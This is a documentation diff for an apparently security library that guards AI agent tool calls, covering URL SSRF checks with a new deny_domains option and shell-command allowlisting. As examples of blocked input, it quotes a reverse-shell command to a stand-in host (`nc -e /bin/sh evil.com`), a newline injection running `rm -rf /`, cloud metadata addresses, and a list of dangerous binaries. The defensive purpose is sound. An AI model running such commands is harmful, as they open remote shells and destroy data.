@@ -546,6 +546,15 @@ constraint.is_safe("http://10.0.0.1/")              # False (private IP)
 # Domain allowlist - only specific domains allowed
 constraint = UrlSafe(allow_domains=["api.github.com", "*.googleapis.com"])
 
+# Domain denylist - block specific domains (deny wins over allow on overlap)
+constraint = UrlSafe(
+    allow_domains=["*.example.com"],
+    deny_domains=["evil.example.com"],
+)
+
+# deny_domains also works against IP addresses (matched as strings)
+constraint = UrlSafe(deny_domains=["169.254.169.254"])
+
 # Custom configuration
 constraint = UrlSafe(
     allow_schemes=["https"],           # HTTPS only
@@ -563,6 +572,7 @@ constraint = UrlSafe(
 - Blocks loopback (127.x, ::1, localhost)
 - Blocks cloud metadata endpoints (169.254.169.254, metadata.google.internal)
 - Blocks IP encoding bypasses (decimal, hex, octal, IPv6-mapped)
+- `deny_domains` explicitly blocks domains/IPs (checked for both hostnames and IPs; deny wins over allow on overlap)
 - Decodes URL-encoded hostnames
 - Optional domain allowlist for maximum restriction
 
@@ -675,12 +685,10 @@ constraint.matches("rm -rf /")              # False (rm not in allowlist)
 | Newline injection | `ls\nrm -rf /` | ✅ |
 | Unauthorized binary | `nc -e /bin/sh evil.com` | ✅ |
 
-**Options:**
-
-```python
-# Block glob characters too (*, ?, [)
-Shlex(allow=["ls"], block_globs=True)
-```
+> [!NOTE]
+> Glob characters (`*`, `?`, `[`) are allowed. They expand to filenames
+> but are not shell injection vectors. If you need to restrict file
+> access, combine `Shlex` with `Subpath`.
 
 > [!WARNING]
 > **Tier 1 Mitigation Only**
@@ -699,9 +707,9 @@ Shlex(allow=["ls"], block_globs=True)
 > **Dangerous Binaries**
 >
 > Even with valid syntax, some binaries are dangerous:
-> - `python`, `perl`, `ruby` — arbitrary code execution
-> - `nc`, `curl`, `wget` — network access / SSRF
-> - `bash`, `sh`, `env`, `xargs` — shell escape
+> - `python`, `perl`, `ruby`: arbitrary code execution
+> - `nc`, `curl`, `wget`: network access / SSRF
+> - `bash`, `sh`, `env`, `xargs`: shell escape
 >
 > Only allow specific, low-risk binaries like `ls`, `cat`, `head`, `tail`, `wc`, `grep`.
 
@@ -1597,8 +1605,8 @@ client = auto_guard(
 
 ## See Also
 
-- [🔬 Explorer Playground](https://tenuo.ai/explorer/) — Test constraints interactively
-- [AI Agent Patterns](./ai-agents) — P-LLM/Q-LLM, prompt injection defense
-- [API Reference](./api-reference) — Full constraint API
-- [Security](./security) — How constraints fit into the security model
-- [LangGraph Integration](./langgraph) — Using constraints with LangGraph
+- [Explorer Playground](https://tenuo.ai/explorer/): Test constraints interactively
+- [AI Agent Patterns](./ai-agents): P-LLM/Q-LLM, prompt injection defense
+- [API Reference](./api-reference): Full constraint API
+- [Security](./security): How constraints fit into the security model
+- [LangGraph Integration](./langgraph): Using constraints with LangGraph
